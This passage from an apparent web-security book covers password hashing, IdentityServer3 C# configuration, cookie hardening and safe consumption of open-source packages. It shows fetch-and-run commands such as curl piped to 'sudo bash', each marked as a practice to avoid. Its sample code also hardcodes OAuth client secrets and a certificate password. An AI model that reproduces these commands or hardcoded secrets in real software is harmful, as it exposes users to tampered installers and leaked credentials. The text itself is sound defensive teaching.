            A.ABP7I2M56JTnekBoUjUtG7G4poxMO3Br+cAPgXqYx//0KKxqILb7uYjuE9ofBr7amQ==
            "secret" 10000 iterations:
            3E800.AN02zizsHZG45IlCu0/8UjPZuwcopaSSBkU/d6VHq3pknf2BE7ExiLL38clIKn575g==
            
            Some more details on how the hash is constructed can be found here:
            https://github.com/brockallen/BrockAllen.MembershipReboot/issues/603
            -->
          </configSections>  
        </configuration>
    
    The iteration count of each users password is stored with the hashed password, as can be seen above on lines 36 and 38. This means each password can have a different number of iterations applied over time as required. Beautifully thought out!
    
    With the ASP.NET Membership Provider you can have salted SHA1 which as already mentioned was not designed for what it was chosen to be used for in this case and there doesn't appear to be any thought to (Moore's Law) the fact that machines keep getting faster. MD5 and SHA were designed to be fast, not slow and able to be slowed down. So storing passwords by SHA-1 hashing means they are incredibly fast to crack.

Sadly the next offering in this space (ASP.NET Identity) that Microsoft produced also seems inferior. Brock Allen blogged about some of the short comings in his post titled "_[The good, the bad and the ugly of ASP.NET Identity](http://brockallen.com/2013/10/20/the-good-the-bad-and-the-ugly-of-asp-net-identity/#ugly)_" in which MembershipReboot caters for, such as the following:

* Email account verification
* Password reset
* Username reminder
* Account lockout
* Password guessing prevention
* Close/Delete account
* Modern password storage strategies (as already discussed)
* Mobile phone verification
* Two factor authentication
* Certificate based authentication
* Auditing
* Tracing

##### External Identity Providers

Microsoft Katana provides support for

* WS-Federation
* OpenID Connect
* Google
* Twitter
* Microsoft Account
* Facebook

There are also many other community provided [OWIN OAuth middleware providers](https://github.com/RockstarLabs/OwinOAuthProviders) 

The OWIN startup or config file could look like the following. You can see in the second half of the code file is the configuration of the external identity providers:

{title="backend\\Auth\\AuthService.WebApi\\Owin\\OwinConfig.cs", linenos=off, lang=C#}
    // Lives in Auth Service of Architecture diagram below.
    using System;
    using System.Collections.Generic;
    using System.Security.Cryptography.X509Certificates;
    using System.Web.Http;
    using AuthService.WebApi.IdSvr;
    using IdentityManager.Logging;
    using IdentityManager.Core.Logging;
    using IdentityServer3.Core.Configuration;
    using Infrastructure.IOC;
    using Infrastructure.WebApi.Owin;
    using Microsoft.Owin.Security.Facebook;
    using Microsoft.Owin.Security.Google;
    using Microsoft.Owin.Security.Twitter;
    using Owin;
    using Serilog;
    
    namespace AuthService.WebApi.Owin {
    
       public class OwinConfig : IOwinConfig {
          // Todo: Add to config file
          public string Name => "Auth Service OWIN Self-Host";
          public string Protocol => "https";
          public string HostName => "localtest.me";
          public int Port => 44334;
          public List<string> Subdomains => new List<string> { "identity" };
    
          public HttpConfiguration BuildConfiguration(IAppBuilder app) {
             // Unhandled exception logger.
             app.Use<GlobalExceptionMiddleware>();
    
             LogProvider.SetCurrentLogProvider(new DiagnosticsTraceLogProvider());
             // TODO: Needs to use IoC to initialise the api controllers.
             Log.Logger = Ioc.Get<Infrastructure.Logging.ILog>().Logger;    
    
             IdentityServerServiceFactory idSvrFactory =
             Factory.Configure(AuthServiceWebApiConstants.ConnectionString);
             idSvrFactory.ConfigureCustomUserService(
                AuthServiceWebApiConstants.ConnectionString
             );
    
             IdentityServerOptions options = new IdentityServerOptions {
                SiteName = "Auth Service",
                SigningCertificate = LoadCertificate(),
                Factory = idSvrFactory,
                AuthenticationOptions = new AuthenticationOptions {
                   IdentityProviders = ConfigureAdditionalIdentityProviders,
                },
                RequireSsl = true // Default = true.                
             };
    
             app.UseIdentityServer(options);
    
             return new HttpConfiguration();
          }
    
          public static void ConfigureAdditionalIdentityProviders(
             IAppBuilder app,
             string signInAsType
          ) {
             GoogleOAuth2AuthenticationOptions google = new GoogleOAuth2AuthenticationOptions {
                AuthenticationType = "Google",
                SignInAsAuthenticationType = signInAsType,
                ClientId =
                   "767400843187-8boio83mb57ruogr9af9ut09fkg56b27.apps.googleusercontent.com",
                ClientSecret = "5fWcBT0udKY7_b6E3gEiJlze"
             };
             app.UseGoogleAuthentication(google);
    
             FacebookAuthenticationOptions fb = new FacebookAuthenticationOptions {
                AuthenticationType = "Facebook",
                SignInAsAuthenticationType = signInAsType,
                AppId = "676607329068058",
                AppSecret = "9d6ab75f921942e61fb43a9b1fc25c63"
             };
             app.UseFacebookAuthentication(fb);
    
             TwitterAuthenticationOptions twitter = new TwitterAuthenticationOptions {
                AuthenticationType = "Twitter",
                SignInAsAuthenticationType = signInAsType,
                ConsumerKey = "N8r8w7PIepwtZZwtH066kMlmq",
                ConsumerSecret = "df15L2x6kNI50E4PYcHS0ImBQlcGIt6huET8gQN41VFpUCwNjM"
             };
             app.UseTwitterAuthentication(twitter);
          }
    
          private X509Certificate2 LoadCertificate() => new X509Certificate2(
             $@"{AppDomain.CurrentDomain.BaseDirectory}\idsrv3test.pfx", "idsrv3test"
          );
       }
    }


#### Architecture

![](images/AuthArchitecture.png)

{title="backend\\Auth\\AuthService.WebApi\\AuthServiceWebApiConstants.cs", linenos=off, lang=C#}
    // Lives in Auth Service of Architecture diagram above.
    namespace AuthService.WebApi {
       public class AuthServiceWebApiConstants {
          public const string AccessTokenValidationUrl =
             "https://identity.localtest.me:44334/connect/accesstokenvalidation?token=";
          public const string ClientConnectTokenUrl =
             "https://identity.localtest.me:44334/connect/token";
          public const string ConnectionString = "AuthServiceDb";
          // 1 day of seconds. Make sure this is equivalent to what the service layer
	      // API is specifying.
          public const int UserAccessLifetime = 86400;
          public const string ServiceLayerClientSecret =
             "9b28b73e-9f66-42bf-ba87-189569136b20";
          public const string ServiceLayerClientId = "ServiceLayerClient";
          public const string CookieName = "sessionId";
          public const int TokenCleanupIntervalSeconds = 60;
       }
    }


{title="client\\ServiceLayer\\ServiceLayerConstants.cs", linenos=off, lang=C#}
    // Lives in Service Layer APIs of Architecture diagram above.
    namespace ServiceLayer {
       public class ServiceLayerConstants {
          public const string AccessTokenValidationUrl =
             "https://identity.localtest.me:44334/connect/accesstokenvalidation?token=";
          public const string ClientConnectTokenUrl =
             "https://identity.localtest.me:44334/connect/token";
          // Days. Make sure this is equivalent to what the auth service is specifying.
          public const double UserAccessLifetime = 1;
          public const string ServiceLayerClientSecret =
             "9b28b73e-9f66-42bf-ba87-189569136b20";
          public const string ServiceLayerClientId = "ServiceLayerClient";
          public const string CookieName = "sessionId";
       }
    }


{title="backend\\Auth\\AuthService.WebApi\\IdSvr\\Clients.cs", linenos=off, lang=C#}
    // Lives in Auth Service of Architecture diagram above.
    using System.Collections.Generic;
    using IdentityServer3.Core;
    using IdentityServer3.Core.Models;
    
    namespace AuthService.WebApi.IdSvrApi {
       public static class Clients {
          public static List<Client> Get() {
             return new List<Client> {
    
                // human is involved
                new Client {
                   ClientName = "Silicon on behalf of Carbon Client",
                   ClientId = AuthServiceWebApiConstants.ServiceLayerClientId,
                   Enabled = true,
                   AccessTokenType = AccessTokenType.Reference,
                   AccessTokenLifetime = AuthServiceWebApiConstants.UserAccessLifetime,
                   Flow = Flows.ResourceOwner,
    
                   RedirectUris = new List<string> {
                      "https://localtest.me:44334"
                   },
    
                   AllowedScopes = new List<string> {
                      Constants.StandardScopes.OpenId,
                      Constants.StandardScopes.Profile,
                      Constants.StandardScopes.Roles,
                      Constants.StandardScopes.OfflineAccess, // For refresh tokens
                      "microservice1",
                      "microservice2",
                      // Etc.
                   },
    
                   ClientSecrets = new List<Secret> {
                      new Secret(AuthServiceWebApiConstants.ServiceLayerClientSecret.Sha256())
                   },
                   /*
                   identityserver.github.io/Documentation/docs/configuration/clients.html
                   Docs on how the config for the refresh token life-cycle works:
                   identityserver.github.io/Documentation/docs/advanced/refreshTokens.html
                   */
                   AbsoluteRefreshTokenLifetime = 2592000, // Seconds: default of 30 days.
                   SlidingRefreshTokenLifetime = 1296000, // Seconds: default of 15 days.
                   RefreshTokenUsage = TokenUsage.OneTimeOnly,
                   RefreshTokenExpiration = TokenExpiration.Sliding
                }
             };
          }
       }
    }

{title="client\\ServiceLayer\\Authentication\\CookieRequestReader.cs", linenos=off, lang=C#}
    // Lives in Service Layer API of Architecture diagram above.
    using System.Linq;
    using System.Net.Http;
    using System.Net.Http.Headers;
    
    namespace ServiceLayer.Authentication {
       /// <summary>Reads any cookie value from the request</summary
       public static class CookieRequestReader {
          public static string GetCookieValue(HttpRequestMessage request, string cookieName) {
             CookieHeaderValue cookie =
                request.Headers.GetCookies(cookieName).FirstOrDefault();
             if (cookie != null) return cookie[cookieName].Value;
             return null;
          }
       }
    }

{title="client\\ServiceLayer\\Authentication\\AuthServiceValidator.cs", linenos=off, lang=C#}
    // Lives in Service Layer API of Architecture diagram above.
    using System.Collections.Generic;
    using System.IO;
    using System.Net;
    using System.Net.Http;
    using System.Text;
    using System.Threading.Tasks;
    using Infrastructure.Logging;
    
    namespace ServiceLayer.Authentication {
       public class AuthServiceValidator : IIdentityValidator {
          private readonly ILog _log;
    
          public AuthServiceValidator(ILog log) {
             _log = log;
          }
    
          // Called on each resource request other than login/outs.
          public string GetTokenClaims(string token) {
             // There's no cookie so no point checking with the auth service.
             if (string.IsNullOrEmpty(token)) return null;
    
             string url = ServiceLayerConstants.AccessTokenValidationUrl + token;
    
             HttpWebRequest outgoingRequest = (HttpWebRequest)WebRequest.Create(url);
             try {
                using (HttpWebResponse response =
                   (HttpWebResponse)outgoingRequest.GetResponse()) {
                   if (response.StatusCode == HttpStatusCode.OK) {
                      using (Stream stream = response.GetResponseStream()) {
                         StreamReader reader = new StreamReader(stream, Encoding.UTF8);
                         string accessTokenValidationJson = reader.ReadToEnd();
                         return accessTokenValidationJson;
                      }
                   }
    
                   _log.Warning(
                      $"Received HTTP status code {response.StatusCode} when calling " +
                      "Identity Server token validation service."
                   );
                   return null;
                }
             } catch (WebException e)
                when (((HttpWebResponse)e.Response).StatusCode == HttpStatusCode.BadRequest) {
                   return null;
             }
          }
    
          // This addresses the faulty logout risk.
          // Called by SecureController.
          public async Task<bool> LogMeOut(string token) {
             string tokenRevocationEndpoint =
                "https://identity.localtest.me:44334/connect/revocation";
    
             Dictionary<string, string> postBody = new Dictionary<string, string> {
                { "token", token },
                { "token_type_hint", "access_token" }
             };
             HttpClient client = new HttpClient();
             client.SetBasicAuthentication(
                ServiceLayerConstants.ServiceLayerClientId,
                ServiceLayerConstants.ServiceLayerClientSecret
             );
             HttpResponseMessage response = await client.PostAsync(
                tokenRevocationEndpoint,
                new FormUrlEncodedContent(postBody)
             );
             return response.StatusCode == HttpStatusCode.OK;
          }
       }
    }

%% {title="client\ServiceLayer\Authentication\AuthenticationHandler.cs", linenos=on, lang=C#}


{title="client\\ServiceLayer\\APIControllers\\SecureController.cs", linenos=off, lang=C#}
    // Lives in Service Layer API of Architecture diagram above.
    using System;
    using System.Collections.Generic;
    using System.Web.Http;
    using System.Net.Http;
    using System.Net.Http.Headers;
    using System.Threading.Tasks;
    using ServiceLayer.Authentication;
    using IdentityModel.Client;
    using Infrastructure.IOC;
    using Infrastructure.Logging;
    
    namespace ServiceLayer.ApiControllers {
    
       [RoutePrefix("api/secure")]
       public class SecureController : ApiController {
          public class LoginDto {
             public string Username { get; set; }
             public string Password { get; set; }
          }
    
          // TokenClient is an Identity Server component.
          private TokenClient _tokenClient;
          private readonly IIdentityValidator _identityValidator;
    
          public SecureController() {
             //  TODO: Needs to use IoC to initialise the api controllers.
             _identityValidator = new AuthServiceValidator(Ioc.Get<ILog>());
    
             _tokenClient = new TokenClient(
                 ServiceLayerConstants.ClientConnectTokenUrl,
                 ServiceLayerConstants.ServiceLayerClientId,
                 ServiceLayerConstants.ServiceLayerClientSecret
             );
          }
    
          [HttpPost]
          [Route("login")]
          public HttpResponseMessage Login(LoginDto login) {
             TokenResponse tokenResponse = GetUserAccessToken(
                // Must include offline_access scope for refresh token.
                new Dictionary<string, string>() {
                   { "userName", login.Username },
                   { "passWord", login.Password },
                   { "scope", "TaskService offline_access" }
                }
             );
             return CreateLoginResponse(tokenResponse);
          }
    
          [HttpGet]
          [Route("logout")]
          public async Task<HttpResponseMessage> Logout() {
             CookieHeaderValue cookie = new CookieHeaderValue(
                ServiceLayerConstants.CookieName,
                string.Empty
             );
             const int yesterday = -1;
             HttpResponseMessage response = new HttpResponseMessage();
             string token = CookieRequestReader.GetCookieValue(
                Request,
                ServiceLayerConstants.CookieName
             );
             bool loggedOut = await _identityValidator.LogMeOut(token);
    
             cookie.MaxAge = TimeSpan.Zero;
             cookie.Expires = DateTimeOffset.Now.AddDays(yesterday);
             cookie.HttpOnly = true;
             cookie.Domain = ".localtest.me";
             cookie.Path = "/";
    
             response.Headers.AddCookies(new CookieHeaderValue[] { cookie });
             response.Content = new StringContent($"{{\"LoggedOut\":\"{loggedOut}\"}}");
             return response;
          }
    
          // Used as part of the "remember me" strategy.
          // Front-end calls when new access token is required.
          [HttpGet]
          [Route("refreshsession")]
          public HttpResponseMessage RefreshSession(string refreshToken) {
             TokenResponse response = _tokenClient.RequestRefreshTokenAsync(
                refreshToken
             ).Result;
             HttpResponseMessage message = CreateLoginResponse(response);
             return message;
          }
    
          private TokenResponse GetUserAccessToken(Dictionary<string, string> credsAndScope) {
             var req = _tokenClient.RequestResourceOwnerPasswordAsync(
                credsAndScope["userName"],
                credsAndScope["passWord"],
                credsAndScope["scope"]
             );
             return req.Result;
          }
    
          private HttpResponseMessage CreateLoginResponse(TokenResponse tokenResponse) {
             CookieHeaderValue cookie = new CookieHeaderValue(
                ServiceLayerConstants.CookieName,
                tokenResponse.AccessToken
             );
	         /*
             owasp.org/index.php/Session_Management_Cheat_Sheet#Expire_and_Max-Age_Attributes
	         */
             cookie.Expires = DateTimeOffset.Now.AddDays(
                ServiceLayerConstants.UserAccessLifetime
             );
             cookie.MaxAge = new TimeSpan(
                hours: ((int)ServiceLayerConstants.UserAccessLifetime) * 24,
                minutes: 0,
                seconds: 0
             );
             cookie.HttpOnly = true;
             cookie.Secure = true;
	         /*
             www.owasp.org/index.php/Session_Management_Cheat_Sheet#Domain_and_Path_Attributes
             Cosider prefixing with the host.
	         */
             cookie.Domain = ".localtest.me";
             cookie.Path = "/";
    
             HttpResponseMessage response = new HttpResponseMessage();
             response.Headers.AddCookies(new CookieHeaderValue[] { cookie });
             response.Content = new StringContent(
                $"{{\"refreshToken\":\"{tokenResponse.RefreshToken}\"}}"
             );
             return response;
          }
       }
    }









MembershipReboot supports adding secret questions and answers along with the ability to update user account details. Details on how this can be done is in the [sample code](https://github.com/brockallen/BrockAllen.MembershipReboot/tree/master/samples) kindly provided by Brock Allen and documentation on their [github wiki](https://github.com/brockallen/BrockAllen.MembershipReboot/wiki#features).

#### Securing Sessions

In the above example we (were constrained by a business requirement) chose to use cookies to carry the access token. Alternatively the access token could be transported within the end users HTTP response and request bodies and stored in local storage.

Using local storage means there is less to be concerned about in terms of protecting the token than using cookies. LocalStorag is only concerned with XSS, where as cookies are susceptible to both CSRF and XSS attacks (although XSS to a lesser degree). If you decided to use local storage, You're anti XSS strategy needs to be water-tight.  
Even with the `HttpOnly` flag set on your cookie, it is possible to compromise the cookie contents if the values of the `Domain` and/or `Path` cookie attributes are too permissive. For example if you have the `Domain` value set to `.localtest.me`, an attacker can attempt to launch attacks on the cookie token between other hosts with the same domain name. Some of these hosts may contain vulnerabilities, thus increasing the attack surface.

| host          | domain name | top level domain |
|---------------|-------------|------------------|
| api           | localtest   | me               |
| identity      | localtest   | me               |
| microservice1 | localtest   | me               |
| microservice2 | localtest   | me               |

Set the [`Secure` attribute](https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Secure_Attribute) on the cookie. This instructs web browsers to only send the cookie over a TLS (HTTPS) connection, thus removing this MItM attack vector.  
You can and should test this by inspecting the headers with an HTTP intercepting proxy. While you're at it, you may as well add this as a test to your [Zap Regression Test suite](#process-agile-development-and-practices-security-regression-testing).

Turn the `HttpOnly` cookie flag on. This instructs web browser to not allow access to the cookie via JavaScript. The `Secure` flag must also be enabled as mentioned above, in order to mitigate Session Id theft.

CSRF is the most common attack used to leverage cookies containing authentication details. In order to mitigate this attack vector, the use of the synchroniser token pattern is recommended. Each server side technology will implement this type of protection differently. CSRF is discussed in more depth in the Cross-Site Request Forgery (CSRF) sections.

As for the `Expires` and `Max-Age` cookie attributes from  
`client\ServiceLayer\APIControllers\SecureController.cs` (seen above), these will need to be set to the maximum values that the business is prepared to accept along with the `Client.AccessTokenLifetime` from `backend\Auth\AuthService.WebApi\IdSvr\Clients.cs` (seen above) (which need to line up) for the IdentityServer.

The OWASP [Session Management Cheat Sheet](https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies) has more details around securing cookies.

### Cryptography on the Client (AKA Untrusted Crypto) {#web-applications-countermeasures-cryptography-on-the-client}

_Todo_

### Consuming Free and Open Source {#web-applications-countermeasures-consuming-free-and-open-source}
![](images/ThreatTags/PreventionEASY.png)

#### Process

Dibbe Edwards [discusses](https://soundcloud.com/owasp-podcast/dibbe-edwards-devops-and-open-source-at-ibm) some excellent initiatives on how they do it at IBM. I will attempt to paraphrase some of them here:

* Implement process and governance around which open source libraries you can use
* Legal review: checking licenses
* Scanning the code for vulnerabilities, manual and automated code review
* Maintain a list containing all the libraries that have been approved for use.  
If not on the list, make request and it should go through the same process.
* Once the libraries are in your product they should become as part of your own code so that they get the same rigour over them as any of your other code written in-house
* There needs to be automated process that runs over the code base to check that nothing that is not on the approved list is included
* Consider automating some of the suggested tooling options below

There is an excellent paper by the SANS Institute on [Security Concerns in Using Open Source Software
for Enterprise Requirements](http://www.sans.org/reading-room/whitepapers/awareness/security-concerns-open-source-software-enterprise-requirements-1305) that is well worth a read. It confirms what the likes of IBM are doing in regards to their consumption of free and open source libraries.

#### Consumption is Your Responsibility

As a developer, you are responsible for what you install and consume. [Malicious NodeJS packages](https://github.com/joaojeronimo/rimrafall) do end up on NPM from time to time. The same goes for any source or binary you download and run. The following commands are often encountered as being "the way" to install things:

{title="wget", linenos=off}
    # Fetching install.sh and running immediately in your shell.
    # Do not do this. Download first -> Check and verify good -> run if good.
    sh -c "$(wget https://raw.github.com/account/repo/install.sh -O -)"

{title="curl", linenos=off}
    # Fetching install.sh and running immediately in your shell.
    # Do not do this. Download first -> Check and verify good -> run if good.
    sh -c "$(curl -fsSL https://raw.github.com/account/repo/install.sh)"

Below is the [official way](https://github.com/nodesource/distributions) to install NodeJS. Do not do this. `wget` or `curl` first, then make sure what you have just downloaded is not malicious.

A>
A> Inspect the code before you run it.
A>

1. The repository could have been tampered with
2. The transmission from the repository to you could have been intercepted and modified.

{title="curl", linenos=off}
    # Fetching install.sh and running immediately in your shell.
    # Do not do this. Download first -> Check and verify good -> run if good.
    curl -sL https://deb.nodesource.com/setup_4.x | sudo -E bash -
    sudo apt-get install -y nodejs

#### Keeping Safe

##### wget, curl, etc:

Please do not `wget`, `curl` or fetch in any way and pipe what you think is an installer or any script to your shell without first verifying that what you are about to run is not malicious. Do not download and run in the same command.

The better option is to:

1. Verify the source that you are about to download, if all good
2. Download it
3. Check it again, if all good
4. Only then should you run it

##### npm install:

As part of an `npm install`, package creators, maintainers (or even a malicious entity intercepting and modifying your request on the [wire](#network-identify-risks-wire-inspecting)) can define scripts to be run on specific [NPM hooks](https://docs.npmjs.com/misc/scripts). You can check to see if any package has hooks (before installation) that will run scripts by issuing the following command:  
`npm show [module-you-want-to-install] scripts`

Recommended procedure:

1. Verify the source that you are about to download, if all good
2. `npm show [module-you-want-to-install] scripts`
3. Download the module without installing it and inspect it. You can download it from `http://registry.npmjs.org/[module-you-want-to-install]/-/[module-you-want-to-install]-VERSION.tgz`

The most important step here is downloading and inspecting before you run.

##### Doppelganger Packages:

Similarly to [Doppelganger Domains](#network-identify-risks-doppelganger-domains), People often miss-type what they want to install. If you were someone that wanted to do something malicious like have consumers of your package destroy or modify their systems, send sensitive information to you, or any number of other criminal activities (ideally identified in the [Identify Risks](#web-applications-identify-risks-consuming-free-and-open-source) section. If not already, add), doppelganger packages are an excellent avenue for raising the likelihood that someone will install your malicious package by miss typing the name of it with the name of another package that has a very similar name. I covered this in my ["0wn1ng The Web"](https://speakerdeck.com/binarymist/0wn1ng-the-web-at-www-dot-wdcnz-dot-com) presentation, with demos.

Make sure you are typing the correct package name. Copy -> Pasting works.

#### Tooling {#web-applications-countermeasures-consuming-free-and-open-source-tooling}

_Todo_ Add nsp

For **NodeJS developers**: Keep your eye on the [nodesecurity advisories](https://nodesecurity.io/advisories). Identified security issues can be posted to [NodeSecurity report](https://nodesecurity.io/report).

##### [RetireJS](https://github.com/RetireJS/retire.js)

Is useful to help you find JavaScript libraries with known vulnerabilities.  
RetireJS has the following:

1. Command line scanner
    * Excellent for CI builds. Include it in one of your build definitions and let it do the work for you.
      * To install globally:  
      `npm i -g retire`
      * To run it over your project:  
      `retire my-project`  
      Results like the following may be generated:

        {linenos=off}
            public/plugins/jquery/jquery-1.4.4.min.js
            ↳ jquery 1.4.4.min has known vulnerabilities:
            http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-4969
            http://research.insecurelabs.org/jquery/test/
            http://bugs.jquery.com/ticket/11290

    * To install RetireJS locally to your project and run as a git `precommit-hook`.  
    There is an NPM package that can help us with this, called `precommit-hook`, which installs the git `pre-commit` hook into the usual `.git/hooks/pre-commit` file of your projects repository. This will allow us to run any scripts immediately before a commit is issued.  
    Install both packages locally and save to `devDependencies` of your `package.json`. This will make sure that when other team members fetch your code, the same `retire` script will be run on their `pre-commit` action.
    
      {linenos=off}
          npm install precommit-hook --save-dev
          npm install retire --save-dev
        
      If you do not configure the hook via the `package.json` to run specific scripts, it will run `lint`, `validate` and `test` by default. See the RetireJS documentation for options.
    
      {linenos=off, lang=JavaScript}
          {
             "name": "my-project",
             "description": "my project does wiz bang",
             "devDependencies": {
                "retire": "~0.3.2",
                "precommit-hook": "~1.0.7"
             },
             "scripts": {
                "validate": "retire -n -j",
                "test": "a-test-script",
                "lint": "jshint --with --different-options"
             }
          }
        
      Adding the `pre-commit` property allows you to specify which scripts you want run before a successful commit is performed. The following `package.json` defines that the `lint` and `validate` scripts will be run. `validate` runs our `retire` command.
    
      {linenos=off, lang=JavaScript}
          {
             "name": "my-project",
             "description": "my project does wiz bang",
             "devDependencies": {
                "retire": "~0.3.2",
                "precommit-hook": "~1.0.7"
             },
             "scripts": {
                "validate": "retire -n -j",
                "test": "a-test-script",
                "lint": "jshint --with --different-options"
             },
             "pre-commit": ["lint", "validate"]
          }
        
      Keep in mind that `pre-commit` hooks can be very useful for all sorts of checking of things immediately before your code is committed. For example running security tests mentioned previously with the [OWASP ZAP API](#process-agile-development-and-practices-security-regression-testing).
2. Chrome extension
3. Firefox extension
4. Grunt plugin
5. Gulp task
6. Burp and OWASP ZAP plugin
7. [On-line tool](http://retire.insecurity.today/) you can simply enter your web applications URL and the resource will be analysed

##### requireSafe

provides "_intentful auditing as a stream of intel for bithound_". I guess watch this space, as in speaking with [Adam Baldwin](https://twitter.com/adam_baldwin), there doesn't appear to be much happening here yet.

##### bithound:

In regards to NPM packages, we know the following things:

1. We know about a small collection of vulnerable NPM packages. Some of which have high fan-in (many packages depend on them).
2. The vulnerable packages have published patched versions
3. Many packages are still consuming the vulnerable unpatched versions of the packages that have published patched versions
  * So although we could have removed a much larger number of vulnerable packages due to their persistence on depending on unpatched packages, we have not. I think this mostly comes down to lack of visibility, awareness and education. This is exactly what I'm trying to change.

bithound supports:

* JavaScript, TypeScript and JSX (back-end and front-end)
* In terms of version control systems, only git is supported
* Opening of bitbucket and github issues
* Providing statistics on code quality, maintainability and stability. I queried Adam on this, but not a lot of information was forth coming.

bithound can be configured to not analyse some files. Very large repositories are prevented from being analysed due to large scale performance issues.

Analyses both NPM and Bower dependencies and notifies you if any are:

* Out of date
* Insecure. Assuming this is based on the known vulnerabilities (41 node advisories at the time of writing this)
* Unused

Analysis of opensource projects are free.

You could of course just list all of your projects and global packages and check that there are none in the [advisories](https://nodesecurity.io/advisories), but this would be more work and who is going to remember to do that all the time?

&nbsp;

For **.Net developers**, there is the likes of [OWASP **SafeNuGet**](https://github.com/OWASP/SafeNuGet).

### Insecure Direct Object References

_Todo_

### Lack of Active Automated Prevention

#### Web Application Firewall (WAF) {#web-applications-countermeasures-lack-of-active-automated-prevention-waf}

[WAFs](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#wafs) are similar to Intrusion Prevention Systems (IPS) except they operate at the [Application Layer](http://en.wikipedia.org/wiki/Application_layer)(HTTP), Layer 7 of the [OSI model](http://en.wikipedia.org/wiki/OSI_model). So they understand the concerns of your web application at a technical level. WAFs protect your application against a large number of attacks, like XSS, CSRF, SQLi, [Local File Inclusion (LFI)](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion), session hijacking, invalid requests (requests to things that do not exist (think 404)). WAFs sit in-line between a gateway and the web application. They run as a proxy. Either on the physical web server or on another network node, but only the traffic directed to the web application is inspected, where as an IDS/IPS inspects all network traffic passed through its interfaces. WAFs use signatures that look like specific vulnerabilities to compare the network traffic targeting the web application and apply the associated rule(s) when matches are detected. Although not only limited to dealing with known signatures, some WAFs can detect and prevent attacks they have not seen before like responses containing larger than specified payloads. Source code of the web application does not have to be modified.

1. [Fusker](https://www.npmjs.com/package/fusker). Not sure if this is still actively maintained. At this point, there has not been any recent commits for about three years, but it does look like the best offering we have at this stage for NodeJS. So if your looking to help a security project out...
2. [express-waf](https://www.npmjs.com/package/express-waf) has recent commits, but there is only a single developer working on it when I checked.

#### Application Intrusion Detection and Response

You can think of this as taking a WAF one step closer to your application. In fact integrating it with your application. Augmenting your application with logic to detect and respond to threats.

[AppSensor](http://appsensor.org/) brings detection -> prevention to your domain level. Most applications today just take attacks & fall over. I have heard so many times we want our applications to fail securely when they get bad input. We do not want our applications being bullied and failing securely.
We want them to not fail at all in production, but rather defend themselves.

Technically AppSensor is not a WAF because the concepts are used to shape your application logic.

The project defines a conceptual framework and methodology that offers prescriptive guidance to implement intrusion detection and automated response into your applications. Providing attack awareness baked in, with real-time defences.

AppSensor provides > 50 (signature based) detection points. Provides guidance on how to respond once an attack is identified. Possible actions include:

* logging out the user
* locking the account or notifying an administrator
* more than a dozen response actions are described.

At the time of writing the sample code is only in Java. The documentation is well worth checking out though. Resources in [Additional Resources]() chapter.

## 4. SSM Risks that Solution Causes

### Lack of Visibility

With the added visibility, you will have to make decisions based on the new found information you now have. There will be no more blissful ignorance if there was before.

#### Insufficient Logging and Monitoring

There will be learning and work to be done to become familiar with libraries and tooling. Code will have to be written around logging as in wrapping libraries, initialising and adding logging statements or hiding them using AOP.

Instrumentation will have to be placed in your code. Again another excellent candidate for AOP.

### Lack of Input Validation, Filtering and Sanitisation

You may have to invest considerable time yourself to gain good understanding into what can go wrong, where, how and how to mitigate it happening. Be inquisitive and experiment.

There will be more code in your systems. More code is more code that can have faults.

Be very careful with sanitisation. Try first to use well tested and battle hardened libraries. Resist going out on your own to modify or create sanitisation routines. They are very easy to miss edge cases and small spots that your untrusted data may end up in that you did not anticipate, thus leaving you susceptible to attack.

#### Buffer Overflows

_Todo_

#### Cross-Site Scripting (XSS)

_Todo_

#### Cross-Site Request Forgery (CSRF)

_Todo_

#### SQLi

_Todo_

#### Command Injection

_Todo_

#### LDAP Injection

_Todo_

#### XPath Injection

_Todo_

#### XQuery Injection

_Todo_

#### XSLT Injection

_Todo_

#### XML Injection

_Todo_

#### Captcha

Bots may/will get smarter and start reading and thinking for themselves. It is probably worth not crossing that bridge until it arrives. This will not stop humans spamming, but neither will any other captcha, unless they also stop genuine users, which according to the studies mentioned in the countermeasures section happens very often.

If you decide to go with one of the captcha options, there is the risk of:

1. Losing customers or potential customers
2. Simply annoying the people that you value
3. Creating/using a captcha that does not suite the capabilities of the legitimate users likely to interact with your web application

### Management of Application Secrets

Reliance on adjacent layers of defence means those layers have to actually be up to scratch. There is a possibility that they will not be.

Possibility of missing secrets being sent over the wire.

Possible reliance on obscurity with many of the strategies I have seen proposed. Just be aware that obscurity may slow an attacker down a little, but it will not stop them.

#### Store Configuration in Configuration files

With moving any secrets from source code to configuration files, there is a possibility that the secrets will not be changed at the same time. If they are not changed, then you have not really helped much, as the secrets are still in source control.

With good configuration tools like node-config, you are provided with plenty of options of splitting up meta-data, creating overrides, storing different parts in different places, etc. There is a risk that you do not use the potential power and flexibility to your best advantage. Learn the ins and outs of what ever system it is you are using and leverage its features to do the best at obscuring your secrets and if possible securing them.

##### node-config

is an excellent configuration package with lots of great features. There is no security provided with node-config, just some potential obscurity. Just be aware of that, and as discussed previously, make sure surrounding layers have beefed up security.

##### Windows:

As is often the case with Microsoft solutions, their marketing often leads people to believe that they have secure solutions to problems when that is not the case. As discussed previously, there are plenty of ways to get around the Microsoft so called security features. As anything else in this space, they may provide some obscurity, but do not depend on them being secure.

Statements like the following have the potential for producing over confidence:

"_vSentry protects desktops without requiring patches or updates, defeating and automatically discarding all known and unknown malware, and eliminating the need for costly remediation._"

Please keep your systems patched and updated.

"_With Bromium micro-virtualization, we now have an answer: A desktop that is utterly secure and a joy to use_"

There is a risk that people will believe this.

##### Linux:

As with Microsofts "virtualisation-based security" Linux containers may slow system compromise down, but a determined attacker will find other ways to get around container isolation. Maintaining a small set of user accounts is a worthwhile practise, but that alone will not be enough to stop a highly skilled and determined attacker moving forward.  
Even when technical security is very good, an experienced attacker will use other mediums to gain what they want, like [social engineering](#people-identify-risks), [physical](#physical-identify-risks) compromise, both, or some other attack vectors listed in this book. Defence in depth is crucial in achieving good security. Concentrating on the lowest hanging fruit first and working your way up the tree.

Locking file permissions and ownership down is good, but that alone will not save you. 

#### Least Privilege

Applying least privilege to everything can take quite a bit of work. Yes, it is probably not that hard to do, but does require a breadth of thought and time. Some of the areas discussed could be missed. Having more than one person working on the task is often effective as each person can bounce ideas off of each other and the other person is likely to notice areas that you may have missed and visa-versa.

#### Location

